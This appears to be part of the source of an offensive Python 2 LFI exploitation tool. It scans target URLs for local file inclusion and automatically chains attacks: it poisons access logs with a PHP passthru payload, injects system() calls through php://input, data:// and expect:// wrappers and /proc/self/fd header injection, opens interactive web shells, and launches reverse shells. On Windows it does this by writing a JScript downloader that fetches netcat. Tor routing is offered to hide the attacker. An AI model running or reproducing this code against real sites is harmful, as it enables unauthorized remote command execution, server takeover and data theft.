		# ----------------------------------------------------- #

		# Try to open an only PHP-based shell
		rand_str = generateRandom()

		send_access_log_cmd("echo '%s';" %rand_str,logmain,keyword+"_PHP")
		resp = (requests.get(ologurl,headers=gen_headers,timeout=15, verify=False)).text
		if(access_control(resp,keyword+"_PHP",rand_str)):
			print "[+] The website seems to be vulnerable. Opening a Shell.."
			time.sleep(1)
			onlyPhpPrint()

			send_access_log_cmd("get_current_user();", logmain, keyword+"_PHP")
			whoami = isUnknown(cleanOutput(access_log_ext(ologurl, "\"%s /" %keyword), True))
			send_access_log_cmd("getcwd();", logmain, keyword+"_PHP")
			pwd = isUnknown(cleanOutput(access_log_ext(ologurl, "\"%s /" %keyword), True))

			cmd = ""
			while(cmd != "exit" and cmd != "quit"):
				cmd = raw_input("%s@%s:%s$ PHP:// " %(whoami, logmain, pwd))
				cmd = cmd.replace("'","\"")
				if(cmd != "exit" and cmd != "quit"):
					send_access_log_cmd(cmd, logmain, keyword+"_PHP")
					print cleanOutput(access_log_ext(ologurl, "\"%s /" %keyword), False)
			exit()
 	# -------------------------------------------------------------------------------------------

def windows_passthru_reverse_shell(ologurl,start_get):
	if(initWindowsReverse()):
		cmd = "echo %s > %s" %(wget_js_content, wget_filename)
		print cleanOutput(send_passthru_cmd(ologurl,cmd,start_get),False)
		cscript = "cscript /nologo %s %s" %(wget_filename,netcat_url)
		print cleanOutput(send_passthru_cmd(ologurl,cscript,start_get),False)

	windows_reverse_shell()
	print cleanOutput(send_passthru_cmd(ologurl,reverseConn,start_get),False)

def passthru_reverse_shell(ologurl,start_get):
	generic_reverse_shell()
	print cleanOutput(send_passthru_cmd(ologurl,reverseConn,start_get),False)

def send_passthru_req(host):
	s = NoURLEncodingSession()
	s.get("%s/<?php passthru($_GET['cmd']);?>" %host, headers=gen_headers)

def passthru_ext(resp,start_get):
	start = (SubstrFind(resp,"GET /"))[start_get-1]
	resp = resp[start:]

	stop = (SubstrFind(resp," HTTP/1.1"))[0]
	stop_apix = (SubstrFind(resp,"\""))[0]
	if(stop_apix < stop):
		stop = stop_apix
	
	output = ""
	for x in range(5,stop):
		output += resp[x]

	return output

def send_passthru_cmd(ologurl,cmd,start_get):
	url = "%s&cmd=%s" %(ologurl,cmd)

	if(cmd == reverseConn):
		r = requests.get(url,headers=gen_headers, verify=False)
	else:
		r = requests.get(url,headers=gen_headers,timeout=15, verify=False)

	resp = r.text

	return passthru_ext(resp,start_get)

def GetPassthru(ologurl, logmain):
	global victimOs

	print colored("\nTrying to inject the website using GET 'passthru' requests.", "white")
	rand_str = generateRandom()
	url = "%s&cmd=echo %s" %(ologurl,rand_str)
	resp = (requests.get(url,headers=gen_headers,timeout=20, verify=False)).text
	vuln_count_before = len(SubstrFind(resp,"GET /%s" %rand_str))

	send_passthru_req(logmain)
	r = requests.get(url,headers=gen_headers,timeout=20, verify=False)
	resp = r.text
	vulns = SubstrFind(resp,"GET /%s" %rand_str)
	vuln_count_after = len(vulns)

	try:
		start = vulns[len(vulns)-1]
	except:
		return

	if(vuln_count_after > vuln_count_before):
		print "\n[+] The website seems to be vulnerable. Opening a System Shell..\n"
		resp = resp[:start]
		got = SubstrFind(resp,"GET /")
		start_get = len(got)+1

		uid = cleanOutput(send_passthru_cmd(ologurl,"id",start_get),True)
		if("uid=" not in uid and "Usage of id by " not in uid):
			# check if Windows operating system
			path = cleanOutput(send_passthru_cmd(ologurl,"path",start_get),True)
			if(checkIfWindows(path)):
				victimOs = "Windows"

		whoami = isUnknown(cleanOutput(send_passthru_cmd(ologurl,"whoami",start_get),True))
		pwd = ""

		if(victimOs == "Windows"):
			pwd = cleanOutput(send_passthru_cmd(ologurl,"cd",start_get),True)
		else:
			pwd = cleanOutput(send_passthru_cmd(ologurl,"pwd",start_get),True)

		shell = "%s@%s:%s$ " %(whoami, logmain, pwd)
		shell.replace(' ','')

		cmd = ""
		while(cmd != "exit" and cmd != "quit"):
			cmd = raw_input("%s" %shell)
			cmd = cmd.replace("'","\"")
			if(cmd != "exit" and cmd != "quit"):
				if(checkIfReverseShell(cmd)):
					if(victimOs != "Windows"):
						passthru_reverse_shell(ologurl,start_get)
					else:
						windows_passthru_reverse_shell(ologurl,start_get)
				else:
					print cleanOutput(send_passthru_cmd(ologurl,cmd,start_get),False)
		print ""
		exit()

def run_access_log():
	global ahactive
	global ahlogurl

	if(ahactive is False):
		ologurl = raw_input("[*] Enter the vulnerable access_log url (ex: 'site/index.php?page=../logs/access_log') -> ")
	else:
		ologurl = ahlogurl

	ologurl = checkHttp(ologurl)
	website = getHTTPWebsite(ologurl)

	# First method: Simple GET
	simpleGETorHEAD("GET",ologurl,website)
	# Second method: Simple HEAD
	print "\n[-] First method did not work!"
	simpleGETorHEAD("HEAD",ologurl,website)
	# Third method: GET passthru
	print "\n[-] Second method did not work!"
	GetPassthru(ologurl,website)
	print "\n[-] All the three access_log hacks failed :(\n"

#----------------------------------------------------------------------------------------------------------------------------------------#

#--------------------------------------------------------php://input---------------------------------------------------------------------#
def windows_phpinput_reverse_shell(inputurl):
	if(initWindowsReverse()):
		cmd = "echo %s > %s" %(wget_js_content, wget_filename)
		send_phpinput_cmd(cmd,inputurl)
		cscript = "cscript /nologo %s %s" %(wget_filename,netcat_url)
		send_phpinput_cmd(cscript,inputurl)

	windows_reverse_shell()
	send_phpinput_cmd(reverseConn,inputurl)

def phpinput_reverse_shell(inputurl):
	global reverseConn

	generic_reverse_shell()
	send_phpinput_cmd(reverseConn,inputurl)

def send_phpinput_cmd(cmd, inputurl):
	global gen_headers

	if(inputurl[-11:] == "php://input"):
		inputurl = inputurl[:-11]

	url = "%sphp://input" %(inputurl)
	phpcmd = cmd[:6] == "php://"
	body = ""

	if(phpcmd):
		cmd = cmd[6:]
		length = 27+len(cmd)
		body = "AbracadabrA ** <?php %s?> **" %cmd
	else:
		length = 34+len(cmd)
		body = "AbracadabrA ** <?php system('%s');?> **" %cmd

	gen_headers['Content-Length'] = '%s' %length
	r = requests.post(url=url, headers=gen_headers, data=body)

	return r.text

def extract_phpinput_res(resp):
	strs = SubstrFind(resp,"AbracadabrA **")

	try:
		p = strs[0]+15
	except:
		return ""

	got = ""
	while(p < len(resp)-1 and (resp[p] != '*' or resp[p+1] != '*')):
		got += resp[p]
		p += 1

	return got[:-1]

def run_phpinput():
	global ahurl
	global ahactive
	global victimOs

	if(ahactive is False):
		inputurl = raw_input("[*] Enter the php://input vulnerable url (ex: 'http://site/index.php?page=') -> ")
	else:
		inputurl = ahurl

	inputurl = checkHttp(inputurl)
	inputurl = cutURLToLastEqual(inputurl)
	resp = send_phpinput_cmd("echo Bodom", inputurl)
	got = SubstrFind(resp,"AbracadabrA **")
	phpcmd = False

	if(len(got) == 0):
		return
	if("system() has been disabled for security reasons in" in resp):
		phpcmd = True

	point = got[0]+15
	print "\n[+] The website seems to be vulnerable. Opening a Shell.."

	if(phpcmd is False):
		_id = cleanOutput(extract_phpinput_res(send_phpinput_cmd("id",inputurl)), True)
		if(len(_id) == 0):
			path = cleanOutput(extract_phpinput_res(send_phpinput_cmd("path",inputurl)), True)
			if(checkIfWindows(path)):
				victimOs = "Windows"

		print colored("[If you want to send PHP commands rather than system commands add php:// before them (ex: php:// fwrite(fopen('a.txt','w'),\"content\");]\n","red")
		whoami = isUnknown(cleanOutput(extract_phpinput_res(send_phpinput_cmd("whoami",inputurl)), True))
		if(victimOs != "Windows"):
			pwd = cleanOutput(extract_phpinput_res(send_phpinput_cmd("pwd",inputurl)), True)
		else:
			pwd = cleanOutput(extract_phpinput_res(send_phpinput_cmd("cd",inputurl)), True)
	else:
		onlyPhpPrint()
		whoami = isUnknown(cleanOutput(extract_phpinput_res(send_phpinput_cmd("php://get_current_user();",inputurl)), True))
		pwd = isUnknown(cleanOutput(extract_phpinput_res(send_phpinput_cmd("php://getcwd();",inputurl)), True))

	time.sleep(1)
	inputmain = removeHttpFromWebsite(extractWebsiteFromUrl(inputurl))
	cmd = ""
	while(cmd != "exit" and cmd != "quit" and cmd != "php://exit" and cmd != "php://quit"):
		if(phpcmd):
			cmd = raw_input("%s@%s:%s$ PHP:// " %(whoami,inputmain,pwd))
			if(cmd[:6] != "php://"):
				cmd = "php://%s" %cmd
		else:
			cmd = raw_input("%s@%s:%s$ " %(whoami,inputmain,pwd))
		if(cmd != "exit" and cmd != "quit" and cmd != "php://exit" and cmd != "php://quit"):
			if(phpcmd is False and checkIfReverseShell(cmd)):
				if(victimOs != "Windows"):
					phpinput_reverse_shell(inputurl)
				else:
					windows_phpinput_reverse_shell(inputurl)
			else:
				print cleanOutput(extract_phpinput_res(send_phpinput_cmd(cmd,inputurl)), False)
	exit()

#----------------------------------------------------------------------------------------------------------------------------------------#

#--------------------------------------------------------data://-----------------------------------------------------------------------#
data_reverse = False

def windows_data_reverse_shell(odataurl,found):
	if(initWindowsReverse()):
		cmd = "echo %s > %s" %(wget_js_content, wget_filename)
		cleanOutput(extract_data_res(send_data_cmd_default(cleanDataCmd(cmd),odataurl,found)), False)
		cscript = "cscript /nologo %s %s" %(wget_filename,netcat_url)
		cleanOutput(extract_data_res(send_data_cmd_default(cleanDataCmd(cscript),odataurl,found)), False)

	windows_reverse_shell()
	cleanOutput(extract_data_res(send_data_cmd_default(cleanDataCmd(reverseConn),odataurl,found)), False)

def data_reverse_shell(odataurl,found):
	generic_reverse_shell()
	print "%s\n" %cleanOutput(extract_data_res(send_data_cmd_default(cleanDataCmd(reverseConn),odataurl,found)), False)

def send_data_cmd_generic(url):
	if(data_reverse):
		content = (requests.get(url,headers=gen_headers, verify=False)).text
	else:
		content = (requests.get(url,headers=gen_headers,timeout=15, verify=False)).text
	return content

def send_data_cmd_simple_nosl(cmd,url):
	#print "requested URL: %sdata:,%s" %(url,cmd)
	return send_data_cmd_generic("%sdata:,%s" %(url,cmd))

def send_data_cmd_simple_sl(cmd,url):
	#print "requested URL: %sdata://,%s" %(url,cmd)
	return send_data_cmd_generic("%sdata://,%s" %(url,cmd))

def send_data_cmd_b64_nosl(cmd,url):
	enc = base64.b64encode(cmd)
	#print "requested URL: %sdata:,%s" %(url,enc)
	return send_data_cmd_generic("%sdata:text/plain;base64,%s" %(url,enc))

def send_data_cmd_b64_sl(cmd,url):
	enc = base64.b64encode(cmd)
	#print "requested URL: %sdata://text/plain;base64,%s" %(url,enc)
	return send_data_cmd_generic("%sdata://text/plain;base64,%s" %(url,enc))

def send_data_cmd_default(cmd, url, choice):
	if(choice == 1):
		return send_data_cmd_simple_nosl(cmd,url)
	elif(choice == 2):
		return send_data_cmd_b64_nosl(cmd,url)
	elif(choice == 3):
		return send_data_cmd_simple_sl(cmd,url)
	else:
		return send_data_cmd_b64_sl(cmd,url)

def extract_data_res(resp):
	return extract_phpinput_res(resp)

def cleanDataCmd(cmd):
	newcmd = "AbracadabrA ** <?php "

	if(cmd[:6] != "php://"):
		if(reverseConn not in cmd):
			cmds = cmd.split('&')
			for c in cmds:
				if(len(c) > 0):
					newcmd += "system('%s');" %c
		else:
			b64cmd = base64.b64encode(cmd)
			newcmd += "system(base64_decode('%s'));" %b64cmd
 	else:
		newcmd += cmd[6:]

	newcmd += "?> **"

	return newcmd

def run_data():
	global ahactive
	global ahurl
	global data_reverse
	global victimOs

	if(ahactive is False):
		odataurl = raw_input("[*] Enter the 'data://' vulnerable url (ex: 'http://site/index.php?page=') -> ")
	else:
		odataurl = ahurl

	odataurl = correctUrl(odataurl)
	odataurl = checkHttp(odataurl)
	rand_str = generateRandom()
	cmd = "<?php system(\"echo %s\");?>" %rand_str
	found = 0
	sys_disabled = False

	for i in range(1,5):
		content = send_data_cmd_default(cmd,odataurl,i)
		if "wrapper is disabled" in content or "no suitable wrapper could be found" in content or "Unable to find the wrapper" in content:
			return
		if("system() has been disabled for security reasons" in content):
			sys_disabled = True
			break

		'''print "\nUsing i = %s I found content:\n" %i
		print "----------------------------------------------------------"
		print content
		print "----------------------------------------------------------\n\n"'''
		indexes = SubstrFind(content,rand_str)
		if(len(indexes) > 0 and ("echo %s" %rand_str) not in content and ("echo%%20%s" %rand_str) not in content):
			found = i
			break

	# check if system() calls have been disabled
	# ---------------------------------------------------------------------
	if(sys_disabled):
		for i in range(1,5):
			cmd = "<?php echo %s;?>" %rand_str
			content = send_data_cmd_default(cmd,odataurl,i)
			indexes = SubstrFind(content,rand_str)
			if(len(indexes) > 0 and ("echo %s" %rand_str) not in content and ("echo%%20%s" %rand_str) not in content):
				found = i
	# ---------------------------------------------------------------------

	#print "found = %s" %found
	if(found != 0):
		print "\n[+] The website seems to be vulnerable. Opening a Shell.."
		if(sys_disabled):
			onlyPhpPrint()
		else:
			print colored("[If you want to send PHP commands rather than system commands add php:// before them (ex: php:// fwrite(fopen('a.txt','w'),\"content\");]\n","red")
		time.sleep(1)

		inputmain = removeHttpFromWebsite(extractWebsiteFromUrl(odataurl))
		whoami = ""
		pwd = ""

		if(sys_disabled is False):
			whoami = cleanOutput(extract_data_res(send_data_cmd_default(cleanDataCmd("whoami"), odataurl, found)), True)
			pwd = isUnknown(cleanOutput(extract_data_res(send_data_cmd_default(cleanDataCmd("pwd"), odataurl, found)), True))
			if(pwd == "?"):
				path = cleanOutput(extract_data_res(send_data_cmd_default(cleanDataCmd("path"), odataurl, found)), True)
				if(checkIfWindows(path)):
					victimOs = "Windows"
					pwd = isUnknown(cleanOutput(extract_data_res(send_data_cmd_default(cleanDataCmd("cd"), odataurl, found)), True))
		else:
			whoami = cleanOutput(extract_data_res(send_data_cmd_default(cleanDataCmd("php://get_current_user();"), odataurl, found)), True)
			whoami = isUnknown(whoami)
			pwd = isUnknown(cleanOutput(extract_data_res(send_data_cmd_default(cleanDataCmd("php://getcwd();"), odataurl, found)), True))

		while(cmd != "exit" and cmd != "quit" and cmd != "php://exit" and cmd != "php://quit"):
			if(sys_disabled):
				cmd = raw_input("%s@%s:%s$ PHP:// " %(whoami,inputmain,pwd))
				if(cmd[:6] != "php://"):
					cmd = "php://%s" %cmd
			else:
				cmd = raw_input("%s@%s:%s$ " %(whoami,inputmain,pwd))
			cmd = cmd.replace("\"","'")
			if(cmd != "exit" and cmd != "quit" and cmd != "php://exit" and cmd != "php://quit"):
				if(sys_disabled is False and checkIfReverseShell(cmd)):
					data_reverse = True
					if(victimOs == "Windows"):
						windows_data_reverse_shell(odataurl,found)
					else:
						data_reverse_shell(odataurl,found)
				else:
					cmd = cleanDataCmd(cmd)
					print "%s\n" %cleanOutput(extract_data_res(send_data_cmd_default(cmd,odataurl,found)), False)
		exit()

#----------------------------------------------------------------------------------------------------------------------------------------#

#--------------------------------------------------------expect://-----------------------------------------------------------------------#
expect_reverse = False

def windows_expect_reverse_shell(oexpecturl):
	if(initWindowsReverse()):
		cmd = "echo %s > %s" %(wget_js_content, wget_filename)
		cleanOutput(extract_expect_res(send_expect_cmd("AbracadabrA ** %s **" %cmd, oexpecturl)), False)
		cscript = "cscript /nologo %s %s" %(wget_filename,netcat_url)
		cleanOutput(extract_expect_res(send_expect_cmd("AbracadabrA ** %s **" %cscript, oexpecturl)), False)

	windows_reverse_shell()
	print cleanOutput(extract_expect_res(send_expect_cmd("AbracadabrA ** %s **" %reverseConn, oexpecturl)), False)

def expect_reverse_shell(oexpecturl):
	generic_reverse_shell()
	print cleanOutput(extract_expect_res(send_expect_cmd("AbracadabrA ** %s **" %reverseConn, oexpecturl)), False)

def send_expect_cmd(cmd,url):
	newurl = "%sexpect://%s" %(url,cmd)
	if(expect_reverse):
		content = (requests.get(newurl,headers=gen_headers, verify=False)).text
	else:
		content = (requests.get(newurl,headers=gen_headers,timeout=15, verify=False)).text
	return content

def extract_expect_res(resp):
	return extract_phpinput_res(resp)

def run_expect():
	global ahactive
	global ahurl
	global expect_reverse
	global victimOs

	if(ahactive is False):
		oexpecturl = raw_input("[*] Enter the 'expect://' vulnerable url (ex: 'http://site/index.php?page=') -> ")
	else:
		oexpecturl = ahurl

	oexpecturl = correctUrl(oexpecturl)
	oexpecturl = checkHttp(oexpecturl)

	rand_str = generateRandom()
	cmd = "echo %s" %rand_str
	content = send_expect_cmd(cmd, oexpecturl)
	indexes = SubstrFind(content, rand_str)
	found = len(indexes) > 0

	if(found and ("echo %s" %rand_str) not in content and "Unable to find the wrapper &quot;expect&quot;" not in content
		and "wrapper is disabled" not in content and ("echo%%20%s" %rand_str) not in content):
		print "\n[+] The website seems to be vulnerable. Opening a System Shell..\n"
		time.sleep(1)

		inputmain = removeHttpFromWebsite(extractWebsiteFromUrl(oexpecturl))
		whoami = cleanOutput(extract_expect_res(send_expect_cmd("whoami", oexpecturl)), True)
		pwd = isUnknown(cleanOutput(extract_expect_res(send_expect_cmd("pwd", oexpecturl)), True))
		if(pwd == "?"):
			path = cleanOutput(extract_expect_res(send_expect_cmd("path", oexpecturl)), True)
			if(checkIfWindows(path)):
				victimOs = "Windows"
				pwd = isUnknown(cleanOutput(extract_expect_res(send_expect_cmd("cd", oexpecturl)), True))

		while(cmd != "exit" and cmd != "quit"):
			cmd = raw_input("%s@%s:%s$ " %(whoami,inputmain,pwd))
			if(cmd != "exit" and cmd != "quit"):
				if(checkIfReverseShell(cmd)):
					expect_reverse = True
					if(victimOs == "Windows"):
						windows_expect_reverse_shell(oexpecturl)
					else:
						expect_reverse_shell(oexpecturl)
				else:
					cmd = "AbracadabrA ** %s **" %cmd
					print cleanOutput(extract_expect_res(send_expect_cmd(cmd,oexpecturl)), False)
		exit()

#----------------------------------------------------------------------------------------------------------------------------------------#

#--------------------------------------------------------/proc/self/fd-------------------------------------------------------------------#
fd_headers = gen_headers
bu_headers = fd_headers
fd_pre_rand_str = generateRandom()

def fd_reverse_shell(errPage,field,ofdurl):
	global reverseConn

	generic_reverse_shell()
	print "%s\n" %cleanOutput(extract_fd_Result(send_self_fd_cmd(errPage,reverseConn,field,ofdurl)),False)

def send_self_fd_cmd(errPage,cmd,field,ofdurl):
	if("php://" in cmd):
		cmd = "%s **<?php %s" %(fd_pre_rand_str,cmd)
		if(";" not in cmd[-2:]):
			cmd = "%s;" %cmd
		cmd = "%s ?> **"
	else:
		cmd = "%s **<?php system(\"%s\"); ?> **" %(fd_pre_rand_str,cmd)

	fd_headers[field] = cmd
	r = requests.get(errPage,headers=fd_headers,timeout=15, verify=False)
	r = requests.get(ofdurl, headers=bu_headers,timeout=15, verify=False)
	return r.text

def extract_fd_Result(resp):
	indexes = SubstrFind(resp,"%s **" %fd_pre_rand_str)
	got = ""
	if(len(indexes) > 0):
		content = resp[(indexes[len(indexes)-1]+17):]
		i = 0
		while(i < len(content)):
			if(content[i] == '*' and content[i+1] == '*'):
				break
			got += content[i]
			i = i+1
	return got

def self_fd_control(resp,toFind):
	got = extract_fd_Result(resp)
	return toFind in got

def run_self_fd():
	global ahactive
	global ahfd_errPage

	if(ahactive is False):
		ofdurl  = raw_input("[*] Enter the '/proc/self/fd' vulnerable url (ex: 'http://site/index.php?page=/proc/self/fd/9') -> ")
		errPage = raw_input("\n[*] Enter a page to request which will produce an error visible in '%s' (ex: 'http://site/robots.txt') -> " %ofdurl)
	else:
		ofdurl = ahfdurl
		errPage = ahfd_errPage

	ofdurl  = checkHttp(ofdurl)
	errPage = checkHttp(errPage)

	field   = raw_input("\n[*] Enter the HTTP header's field to inject (it MUST appear in the error logs!) (ex: 'referer') -> ")
	rand_str = generateRandom()
	resp = send_self_fd_cmd(errPage,"php://echo %s;" %rand_str,field,ofdurl)
	echoes  = SubstrFind(resp,"echo %s" %rand_str)
	echoes2 = SubstrFind(resp,"echo%%20%s" %rand_str)

	if(self_fd_control(resp,rand_str) and len(echoes) == 0 and len(echoes2) == 0):
		print "\n[+] The website seems to be vulnerable. Opening a Shell..\n"
		resp = send_self_fd_cmd(errPage,"id",field,ofdurl)
		whoami = ""
		pwd = ""
		sys_disabled = False
		shell_host = removeHttpFromWebsite(extractWebsiteFromUrl(ofdurl))
		if(self_fd_control(resp,"system() has been disabled for security reasons in")):
			sys_disabled = True
			onlyPhpPrint()
			whoami = cleanOutput(extract_fd_Result(send_self_fd_cmd(errPage,"php://get_current_user();",field,ofdurl)),True).replace(" ","")
			whoami = isUnknown(whoami)
			pwd = cleanOutput(extract_fd_Result(send_self_fd_cmd(errPage,"php://getcwd();",field,ofdurl)),True).replace(" ","")
			pwd = isUnknown(pwd)
		else:
			whoami = cleanOutput(extract_fd_Result(send_self_fd_cmd(errPage,"whoami",field,ofdurl)),True).replace(" ","")
			pwd = cleanOutput(extract_fd_Result(send_self_fd_cmd(errPage,"pwd",field,ofdurl)),True).replace(" ","")

		while(cmd != "exit" and cmd != "quit" and cmd != "php://exit" and cmd != "php://quit"):
			if(sys_disabled):
				cmd = raw_input("%s@%s:%s$ PHP:// " %(whoami,inputmain,pwd))
				if(cmd[:6] != "php://"):
					cmd = "php://%s" %cmd
			else:
				cmd = raw_input("%s@%s:%s$ " %(whoami,inputmain,pwd))
			#cmd = cmd.replace("\"","'")
			if(cmd != "exit" and cmd != "quit" and cmd != "php://exit" and cmd != "php://quit"):
				print "%s\n" %cleanOutput(extract_fd_Result(send_self_fd_cmd(errPage,cmd,field,ofdurl)),False)
		exit()

#----------------------------------------------------------------------------------------------------------------------------------------#

#---------------------------------------------------------------LFI Scanner--------------------------------------------------------------#
def scanner():
	global ahactive
	global ahpaths
	global ahlogs
	global ahenv
	global ahfd
	global ahgen
	global ahcnf

	print colored("\n.:: LFI Scanner ::.\n", "white")
	fname = raw_input("[*] Enter the name of the file containing the paths to test [default: 'pathtotest.txt'] -> ")
	if(len(fname) == 0):
		fname = "pathtotest.txt"
	fname = checkFilename(fname)

	if(ahactive is False):
		owebsite = raw_input("[*] Enter the URL to scan (ex: 'http://site/vuln.php?id=') -> ")
		owebsite = correctUrl(owebsite)
		owebsite = checkHttp(owebsite)
	else:
		owebsite = ahurl

	print ""
	for line in file(fname):
	    c = line.strip('\n')
	    website = owebsite+c
	    status_code = 500

	    try:
	    	r = requests.get(website, headers=gen_headers, timeout=7, verify=False)
	    	content = r.content
	    	status_code = 200
	    except:
	        print "[!] Problem reaching '%s'." %website
	      	content = ""

	    #content = r.content
	    if(status_code == 200):
	        if ("[<a href='function.main'>function.main</a>" not in content
	        	and "[<a href='function.include'>function.include</a>" not in content
	        	and ("Failed opening" not in content and "for inclusion" not in content)
	        	and "failed to open stream:" not in content
	        	and "open_basedir restriction in effect" not in content
	        	and ("root:" in content or ("sbin" in content and "nologin" in content)
	            or "DB_NAME" in content or "daemon:" in content or "DOCUMENT_ROOT=" in content
	            or "PATH=" in content or "HTTP_USER_AGENT" in content or "HTTP_ACCEPT_ENCODING=" in content
	            or "users:x" in content or ("GET /" in content and ("HTTP/1.1" in content or "HTTP/1.0" in content))
	            or "apache_port=" in content or "cpanel/logs/access" in content or "allow_login_autocomplete" in content
	            or "database_prefix=" in content or "emailusersbandwidth" in content or "adminuser=" in content
	            or ("error]" in content and "[client" in content and "log" in website)
	            or ("[error] [client" in content and "File does not exist:" in content and "proc/self/fd/" in website)
	            or ("State: R (running)" in content and ("Tgid:" in content or "TracerPid:" in content or "Uid:" in content)
	            	and "/proc/self/status" in website))):
	            print colored("[+] '%s' [Vulnerable]" %website, "red")
	            #print "main() [<a href='function.include'>function.include</a>" not in content
	            #print "\n------------------------------\n%s\n\n" %content

	            ahpaths.append(website)

	            if("log" in website):
	            	ahlogs.append(website)
	            elif("/proc/self/environ" in website):
	            	ahenv.append(website)
	            elif("/proc/self/fd" in website):
	            	ahfd.append(website)
	            elif(".cnf" in website or ".conf" in website or ".ini" in website):
	            	ahcnf.append(website)
	            else:
					ahgen.append(website)
	        else:
	            print "[-] '%s' [Not vulnerable]" %website
	    else:
	        print "[!] Problem connecting to the website.\n"

	print colored("\n[+] Retrieved %s interesting paths.\n" %len(ahpaths),"white")
	time.sleep(0.5)

	showInterestingPath("Logs",ahlogs)
	showInterestingPath("/proc/self/environ",ahenv)
	showInterestingPath("/proc/self/fd",ahfd)
	showInterestingPath("Configuration", ahcnf)
	showInterestingPath("Generic",ahgen)

#----------------------------------------------------------------------------------------------------------------------------------------#

#---------------------------------------------------------------Auto Hack----------------------------------------------------------------#
def run_autoHack():
	global ahurl
	global ahactive
	global ahpaths
	global ahlogs
	global ahfd
	global ahenv
	global ahcnf
	global ahgen
	global ahenvurl
	global ahlogurl
	global ahwebsite
	global ahpath
	global ahfdurl
	global ahfd_errPage

	ahactive = True
	ahurl = raw_input("[*] Enter the URL you want to try to hack (ex: 'http://site/vuln.php?id=') -> ")
	ahurl = correctUrl(ahurl)
	ahurl = checkHttp(ahurl)

	scanner()

	time.sleep(1)
	# /proc/self/environ Exploitation
	if(len(ahenv) > 0):
		for env in ahenv:
			print colored("\n[*] Trying to exploit /proc/self/environ on '%s'.." %env, "yellow")
			ahenvurl = env
			run_self_environ()

	time.sleep(1)
	# php://input Exploitation
	print colored("\n[*] Trying to exploit php://input wrapper on '%s'.." %ahurl, "yellow")
	run_phpinput()

	time.sleep(1)
	# Access Logs Exploitation
	if(len(ahlogs) > 0):
		for log in ahlogs:
			if("access" in log):
				print colored("\n[*] Trying to exploit access logs' file on '%s'.." %log, "yellow")
				ahlogurl = log
				run_access_log()

	time.sleep(1)
	# /proc/self/fd Exploitation
	if(len(ahfd) > 0):
		ahfd_errPage = raw_input("[*] Enter a page to request which will produce an error visible in your /proc/self/fd logs (ex: 'http://site/robots.txt') -> ")
		for fd in ahfd:
			print colored("\n[*] Trying to exploit /proc/self/fd on '%s'.." %fd, "yellow")
			ahfdurl = fd
			run_self_fd()

	time.sleep(1)
	# data:// Exploitation
	print colored("\n[*] Trying to exploit data:// wrapper on '%s'.." %ahurl, "yellow")
	run_data()

	time.sleep(1)
	# expect:// Exploitation
	print colored("\n[*] Trying to exploit expect:// wrapper on '%s'.." %ahurl, "yellow")
	run_expect()

	time.sleep(1)
	# phpinfo Exploitation
	print colored("\n[*] Trying to exploit phpinfo through '%s'.." %ahurl, "yellow")
	ahwebsite = extractWebsiteFromUrl(ahurl)
	ahpath = extractPathFromUrl(ahurl)

	toadd = extractPathFromPaths()
	if("<NOT APPLICABLE" not in toadd):
		ahpath += toadd
		run_phpinfo()

	time.sleep(1)
	# php://filter Exploitation
	print colored("\n[*] Trying to get some pages' content using php://filter on '%s'.." %ahurl, "yellow")
	run_phpfilter()

#----------------------------------------------------------------------------------------------------------------------------------------#

banner()
check_for_update()
time.sleep(0.5)
choice = "4"
validChoice = (choice == "1" or choice == "2" or choice == "x")

while(validChoice is False):
	print "--------------------"
	print " 1) Exploiter       "
	print " 2) Scanner         "
	print " x) Exit            "
	print "--------------------"
	choice = raw_input(" -> ")

	if(choice == "x" or choice == "3"):
		exit()
	if(choice == "1" or choice == "2"):
		validChoice = True
		input_cookie = raw_input("\n[*] Enter cookies if needed (ex: 'PHPSESSID=12345;par=something') [just enter if none] -> ")
		if(len(input_cookie) > 0):
			gen_headers['Cookie'] = input_cookie
		#gen_headers['Cookie'] = "security=low; PHPSESSID=n3o05a33llklde1r2upt98r1k2"

		use_tor = raw_input("\n[?] Do you want to enable TOR proxy ? (y/n) ")
		if(use_tor == "y" or use_tor == "Y" or use_tor == "yes"):
			tor_addr = raw_input("[*] Tor IP [default='127.0.0.1'] -> ")
			tor_port = raw_input("[*] Tor Port [default=9150] -> ")
			if(len(tor_addr) == 0):
				tor_addr = "127.0.0.1"
			if(tor_port.isdigit() is False or int(tor_port) > 65535 or int(tor_port) < 1):
				print "[!] Invalid port! Using 9150."
				tor_port = 9150

			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, tor_addr, int(tor_port))
			socket.socket = socks.socksocket
			print colored("[+] TOR proxy active on socks5://%s:%s" %(tor_addr,tor_port),"red")
			time.sleep(0.5)

		if(choice == "2" or choice == "b"):
			scanner()
		elif(choice == "1" or choice == "a"):
			echoice = "11"
			while((echoice < 1 or echoice > 10) and echoice != "x"):
				print colored("\n.:: LFI Exploiter ::.\n", "white")
				print "____________________________\n"
				print "    Available Injections    "
				print "____________________________\n"
				print " 1) /proc/self/environ      "
				print " 2) php://filter            "
				print " 3) php://input             "
				print " 4) /proc/self/fd           " 
				print " 5) access_log              "
				print " 6) phpinfo                 "
				print " 7) data://		    	   " 
				print " 8) expect://		  	   " 
				print " 9) Auto-Hack  			   "
				print " x) Back 				   "
				print "____________________________"
				echoice = raw_input("\n -> ")

				if(echoice == "1" or echoice == "a"):
					printChoice("/proc/self/environ") # 
					run_self_environ()
				elif(echoice == "2" or echoice == "b"):
					printChoice("php://filter wrapper")
					run_phpfilter()
				elif(echoice == "3" or echoice == "c"):
					printChoice("php://input wrapper")
					run_phpinput()
					print "\n[-] This website is not vulnerable to the php://input injection attack.\n"
				elif(echoice == "4" or echoice == "d"):
					printChoice("/proc/self/fd")
					run_self_fd() 
					print "\n[!] This website is not vulnerable to the /proc/self/fd attack!\n"
				elif(echoice == "5" or echoice == "e"):
					printChoice("Access log")
					run_access_log()
				elif(echoice == "6" or echoice == "f"):
					printChoice("phpinfo")
					run_phpinfo()
				   	print "\n[!] This website is not vulnerable to the phpinfo injection attack!\n"
				elif(echoice == "7" or echoice == "g"):
					printChoice("data:// wrapper")
					run_data()
					print "\n[!] This website is not vulnerable to the data:// injection attack!\n"
				elif(echoice == "8" or echoice == "h"):
					printChoice("expect:// wrapper")
					run_expect()
					print "\n[!] This website is not vulnerable to the expect:// injection attack!\n"
				elif(echoice == "9" or echoice == "i"):
					printChoice("Auto Hack")
					run_autoHack()
					print "\n[!] This website is not vulnerable to any of our attacks!\n"
				elif(echoice == "10" or echoice == "x"):
					print ""
					validChoice = False
				else:
					invalidChoice()
	else:
		invalidChoice() 
